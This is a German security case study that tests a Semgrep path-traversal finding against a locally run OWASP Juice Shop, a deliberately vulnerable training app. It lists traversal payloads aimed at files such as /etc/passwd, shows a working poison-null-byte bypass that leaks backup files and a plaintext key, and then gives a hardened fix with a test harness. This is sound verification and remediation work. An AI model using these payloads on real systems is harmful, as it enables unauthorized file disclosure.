# Fallstudie: was der `res.sendFile`-Verdacht am File-Server wirklich hergibt

## Finding

Semgrep meldet mit der Regel `express-res-sendfile` vier Fundstellen im festgelegten Juice-Shop-Stand (`5658473cf8814459bf89000ce373b20ed0b4eb37`):

- `routes/fileServer.ts:32`
- `routes/keyServer.ts:14`
- `routes/logfileServer.ts:14`
- `routes/quarantineServer.ts:14`

Alle vier bauen den Pfad aus einem Request-Parameter: `res.sendFile(path.resolve('<basis>/', file))`. Der SAST-Verdacht ist die Path-Traversal- bzw. Arbitrary-File-Read-Klasse (CWE-22): Steuert der Angreifer `file`, könnte `path.resolve` mit `../` aus dem Basisverzeichnis herausführen und beliebige Dateien des Hosts ausliefern.

Ein SAST-Treffer ist aber ein Prüfauftrag, kein Beleg. Diese Fallstudie klärt am laufenden, per Digest festgelegten Container mit reproduzierbaren Requests, **was der Endpunkt tatsächlich herausgibt** — und was nicht.

## Die beiden Kontrollen im Zielcode

`routes/fileServer.ts` (Route `/ftp(?!/quarantine)/:file`) hat **zwei** vorgelagerte Kontrollen:

```ts
if (!file.includes('/')) {            // (1) keine Slashes im Dateinamen
  verify(file, res, next)
} ...
function verify (file, res, next) {
  if (file && (endsWithAllowlistedFileType(file) || file === 'incident-support.kdbx')) {
    file = security.cutOffPoisonNullByte(file)   // (2) Endungs-Allowlist .md/.pdf
    res.sendFile(path.resolve('ftp/', file))
  } else { res.status(403) ... }
}
```

Die drei Geschwisterdateien (`keyServer.ts` → `encryptionkeys/`, `logfileServer.ts` → `logs/`, `quarantineServer.ts` → `ftp/quarantine/`) haben **nur** Kontrolle (1). Keinen Endungsfilter.

Wichtig für den Test ist die Implementierung von `cutOffPoisonNullByte` in `lib/insecurity.ts`:

```ts
export const cutOffPoisonNullByte = (str) => {
  const nullByte = '%00'
  if (str.includes(nullByte)) return str.substring(0, str.indexOf(nullByte))
  return str
}
```

Sie schneidet an der **literalen Zeichenfolge `%00`** ab, nicht an einem dekodierten Null-Byte. Deshalb ist die Nutzlast `%2500`: Express dekodiert `%25` zu `%`, im Parameter steht dann literal `%00`.

## Messkontext

- Ziel: `bkimminich/juice-shop@sha256:73c53fbf442e8337b3ea3d98c7e8550308854701ebdfce4cc39768f36b75430e` (Label: Juice Shop 20.2.0), Quellcode-Revision `5658473c`
- Datum: 2026-09-19, lokal, Docker
- Start: `docker run -d -p 3000:3000 bkimminich/juice-shop@sha256:73c5...`
- Werkzeug: `curl --path-as-is`, damit der Client `../` und Prozentkodierung **nicht** vorab normalisiert. Ohne dieses Flag prüft man den Client, nicht den Server.
- Jede Zeile unten ist ein einzelner Request. Kein Login, kein aktiver Scanner, keine Zugangsdaten.

## Ergebnis 1 — Endpunkt erreichbar, Normalfall

```http
GET /ftp/legal.md            -> 200  text/markdown          3046 B  "# Legal Information ..."
GET /ftp/acquisitions.md     -> 200  text/markdown           908 B  "# Planned Acquisitions ..."
```

Der Endpunkt liefert erlaubte Dateien aus dem `ftp/`-Verzeichnis aus. Basis steht.

## Ergebnis 2 — Path Traversal ist **nicht** reproduzierbar

Alle Ausbruchsversuche werden abgewiesen, auf allen vier Endpunkten:

| Request (`--path-as-is`) | Status | ausgeliefert |
|---|---|---|
| `/ftp/..%2fpackage.json` | 403 | nein |
| `/ftp/%2e%2e%2f%2e%2e%2fpackage.json` | 403 | nein |
| `/ftp/..%2f..%2f..%2f..%2fetc%2fpasswd` | 403 | nein |
| `/ftp/../../package.json` (literal) | 403 | nein |
| `/ftp/..%2f..%2fpackage.json%2500.md` (Traversal + Null-Byte) | 403 | nein |
| `/encryptionkeys/..%2f..%2fpackage.json` | 403 | nein |
| `/support/logs/..%2f..%2fpackage.json` | 403 | nein |
| `/ftp/quarantine/..%2f..%2f..%2fpackage.json` | 403 | nein |

Verbatim:

```http
GET /ftp/..%2f..%2f..%2f..%2fetc%2fpasswd
HTTP/1.1 403 Forbidden
<title>ForbiddenError: Forbidden</title>
```

Bemerkenswert ist der Fehlertyp: `ForbiddenError: Forbidden`, **nicht** die anwendungseigene Meldung „File names cannot contain forward slashes!". Die prozentkodierten Slashes werden also schon von der Express-/`send`-Ebene abgewiesen, bevor der Handler und dessen Slash-Prüfung überhaupt greifen. Die anwendungseigene Kontrolle (1) ist damit weitgehend redundant — die Einschränkung auf ein einzelnes Verzeichnis hält aber, und zwar auch auf den drei Endpunkten, die **keinen** Endungsfilter haben.

**Zwischenstand:** Die von der Semgrep-Regel implizierte Worst Case — beliebiger Dateizugriff auf dem Host — ist an diesem Zielstand nicht auslösbar.

## Ergebnis 3 — Der Endungsfilter ist per Poison Null Byte umgehbar

Zuerst die Kontrolle: dieselben Dateien **ohne** Nutzlast werden korrekt abgewiesen.

```http
GET /ftp/package.json.bak    -> 403  "Only .md and .pdf files are allowed!"
GET /ftp/eastere.gg          -> 403  "Only .md and .pdf files are allowed!"
```

Mit angehängtem `%2500.md` fällt der Filter:

| Request | Status | Content-Type | ausgelieferter Inhalt |
|---|---|---|---|
| `/ftp/package.json.bak%2500.md` | **200** | application/octet-stream | Entwicklungs-Backup der `package.json` (4262 B) |
| `/ftp/coupons_2013.md.bak%2500.md` | **200** | application/octet-stream | verschlüsselte Coupon-Codes (131 B) |
| `/ftp/eastere.gg%2500.md` | **200** | application/octet-stream | Easter-Egg-Datei (324 B) |
| `/ftp/suspicious_errors.yml%2500.md` | **200** | text/yaml | Sigma-Regel-Datei (723 B) |

Verbatim:

```http
GET /ftp/package.json.bak            -> 403 Forbidden   (Only .md and .pdf files are allowed!)
GET /ftp/package.json.bak%2500.md    -> 200 OK          { "name": "juice-shop", "version": "6.2.0-SNAPSHOT", ... }
```

**Mechanik:** `package.json.bak%00.md` endet auf `.md` → Allowlist bestanden. Danach schneidet `cutOffPoisonNullByte` an `%00` ab → `package.json.bak` → `res.sendFile('ftp/package.json.bak')`. Die Prüfung entscheidet über den *vorläufigen* Namen, ausgeliefert wird der *abgeschnittene*. Genau diese Reihenfolge ist der Bug (CWE-158, Improper Neutralization of Null Byte).

## Ergebnis 4 — Die Geschwister-Endpunkte prüfen die Endung gar nicht

`keyServer`, `logfileServer` und `quarantineServer` haben nur die Slash-Kontrolle. Jede Datei in ihrem Verzeichnis ist direkt lesbar — ohne Null-Byte-Trick:

| Request | Status | ausgeliefert |
|---|---|---|
| `/encryptionkeys/premium.key` | **200** | statischer Schlüssel im Klartext: `1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42` |
| `/support/logs/access.log.2026-09-19` | **200** | Server-Logdatei (hier leer, aber erreichbar) |
| `/ftp/quarantine/juicy_malware_windows_64.exe.url` | **200** | Quarantäne-Artefakt |

## Bewertung

| Frage | Antwort | Beleg |
|---|---|---|
| Beliebiger Dateizugriff auf dem Host (Semgrep-Worst-Case)? | **Nein** | Ergebnis 2, 8 Traversal-Varianten → 403 |
| Endungs-Allowlist auf `/ftp/:file` umgehbar? | **Ja**, per Poison Null Byte | Ergebnis 3, Kontrolle vs. Nutzlast |
| Geschwister-Endpunkte mit Typprüfung geschützt? | **Nein**, gar kein Filter | Ergebnis 4 |
| Auswirkung | begrenzte Informationsoffenlegung **innerhalb** von `ftp/`, `encryptionkeys/`, `logs/`, `ftp/quarantine/` | Ergebnis 3 + 4 |

Der ehrliche Befund liegt zwischen „harmlos" und „arbitrary read": Der Slash-Filter (verstärkt durch die Express-/`send`-Ebene) verhindert den Ausbruch aus dem Verzeichnis zuverlässig — das ist der wirksame Teil. Der *Typ*-Filter, den `fileServer.ts` zusätzlich aufsetzt, ist dagegen umgehbar, und die drei Geschwister setzen ihn gar nicht erst. Konkret ausgelesen wurden dabei ein Entwickler-Backup der `package.json`, verschlüsselte Coupon-Codes und ein statischer Schlüssel im Klartext. Die Blast Radius ist auf vier bekannte Verzeichnisse begrenzt, aber real.

Das deckt sich mit der Absicht von Juice Shop: `fileServer.ts` implementiert bewusst mehrere Trainings-Challenges (u. a. „Poison Null Byte", „Forgotten Developer Backup", „Forgotten Sales Backup"). Der Endpunkt ist absichtlich verwundbar — der Wert dieser Fallstudie ist der **Beleg mit Request/Response**, nicht die Neuentdeckung.

## Fix + Nachtest

Der Zielcode gehört zu einer absichtlich verwundbaren Trainingsanwendung; er wird hier **nicht** in einem fremden Repository gepatcht. Um den Fix trotzdem zu belegen, isoliert ein kleines Node-Harness (nur Standardbibliothek) die Anwendungslogik von `fileServer.ts` und stellt der verwundbaren eine gehärtete Variante gegenüber. Beide bekommen dieselben Requests.

Der Fix macht drei Dinge anders:

1. **Null-Bytes ablehnen**, statt sie nachträglich abzuschneiden (`%00`, roher NUL).
2. Den aufgelösten Pfad **auf das Basisverzeichnis einschränken** (`resolved.startsWith(base + sep)`) — Defense in Depth gegen Traversal.
3. Die Endungs-Allowlist auf dem **tatsächlich ausgelieferten** Namen prüfen, nicht auf der Roh-Eingabe.

```js
// Kern der gehärteten Variante (vollständiges Harness siehe unten)
function fixed (file, res) {
  if (file.includes(' ') || file.includes('%00') ||
      file.includes('/') || file.includes('\\'))
    return send(res, 403, 'Rejected: illegal character in file name')
  const resolved = path.resolve(BASE, file)
  if (resolved !== BASE && !resolved.startsWith(BASE + path.sep))
    return send(res, 403, 'Rejected: path escapes base directory')
  if (!(endsWithAllowlistedFileType(resolved) ||
        path.basename(resolved) === 'incident-support.kdbx'))
    return send(res, 403, 'Only .md and .pdf files are allowed!')
  return serveResolved(res, resolved)
}
```

Nachtest, identische Nutzlasten gegen beide Varianten (2026-09-19):

| Request | verwundbar | gehärtet |
|---|---|---|
| `/legal.md` (legitim) | 200 | **200** (bleibt nutzbar) |
| `/package.json.bak` (ohne Trick) | 403 | 403 |
| `/package.json.bak%2500.md` | **200 (Leak)** | **403** (illegal character) |
| `/eastere.gg%2500.md` | **200 (Leak)** | **403** (illegal character) |
| `/..%2fsecret.txt` (Traversal) | 403 | **403** (path escapes base) |

Der Bypass ist geschlossen, legitime `.md`-Dateien funktionieren weiter. Das ist der Unterschied zwischen „Finding gemeldet" und „Finding verstanden und behoben".

<details>
<summary>Vollständiges Reproduktions-Harness (<code>node server.js</code>, keine Abhängigkeiten)</summary>

```js
const http = require('node:http')
const path = require('node:path')
const fs = require('node:fs')
const BASE = path.resolve(__dirname, 'ftp')

const cutOffPoisonNullByte = (str) => {
  const nb = '%00'
  return str.includes(nb) ? str.substring(0, str.indexOf(nb)) : str
}
const endsWithAllowlistedFileType = (p) => p.endsWith('.md') || p.endsWith('.pdf')
const send = (res, s, b) => { res.writeHead(s, { 'Content-Type': 'text/plain; charset=utf-8' }); res.end(b) }
const serveResolved = (res, r) => fs.readFile(r, (e, d) => e ? send(res, 404, 'Not found') : (res.writeHead(200), res.end(d)))

function vuln (file, res) {                       // verbatim aus fileServer.ts
  if (file.includes('/')) return send(res, 403, 'File names cannot contain forward slashes!')
  if (file && (endsWithAllowlistedFileType(file) || file === 'incident-support.kdbx')) {
    file = cutOffPoisonNullByte(file)
    return serveResolved(res, path.resolve(BASE, file))
  }
  return send(res, 403, 'Only .md and .pdf files are allowed!')
}
function fixed (file, res) {
  if (file.includes(' ') || file.includes('%00') || file.includes('/') || file.includes('\\'))
    return send(res, 403, 'Rejected: illegal character in file name')
  const resolved = path.resolve(BASE, file)
  if (resolved !== BASE && !resolved.startsWith(BASE + path.sep))
    return send(res, 403, 'Rejected: path escapes base directory')
  if (!(endsWithAllowlistedFileType(resolved) || path.basename(resolved) === 'incident-support.kdbx'))
    return send(res, 403, 'Only .md and .pdf files are allowed!')
  return serveResolved(res, resolved)
}
http.createServer((req, res) => {
  const parts = req.url.split('?')[0].split('/').filter(Boolean)
  let seg = parts.slice(1).join('/')
  try { seg = decodeURIComponent(seg) } catch (e) {}   // ein Decode, wie Express bei :param
  if (parts[0] === 'vuln') return vuln(seg, res)
  if (parts[0] === 'fixed') return fixed(seg, res)
  send(res, 404, 'use /vuln/:file or /fixed/:file')
}).listen(3100)
```

Fixtures: `ftp/legal.md`, `ftp/eastere.gg`, `ftp/package.json.bak` sowie ein `secret.txt` eine Ebene über `ftp/`. Test z. B. `curl --path-as-is http://localhost:3100/fixed/eastere.gg%2500.md`.

</details>

## Aussage und Grenze

- **Primärbeleg** ist der laufende, per Digest festgelegte Container. Das Harness dient ausschließlich dem Fix-Nachweis, weil fremder Trainingscode nicht gepatcht wird; es bildet die Anwendungslogik nach, nicht die Express-interne Slash-Abweisung.
- Geprüft ist ein einzelner, unauthentifizierter Stand. Andere Juice-Shop-Versionen, andere Betriebssysteme (Groß-/Kleinschreibung, Pfadtrenner) oder ein vorgeschalteter Reverse-Proxy mit eigener Dekodierung können das Bild verschieben.
- Der Befund ist eine begrenzte Informationsoffenlegung, kein Remote Code Execution und kein Ausbruch aus dem Verzeichnis. Genau diese Zurückhaltung ist der Punkt: Ein belegtes „so weit und nicht weiter" ist mehr wert als eine überzeichnete Schlagzeile.

Verwandt: die Pipeline-Fallstudie [ein grüner Job trotz kaputtem Scanner](case-study-fail-closed.md) und die [Findings-Einordnung](findings.md).
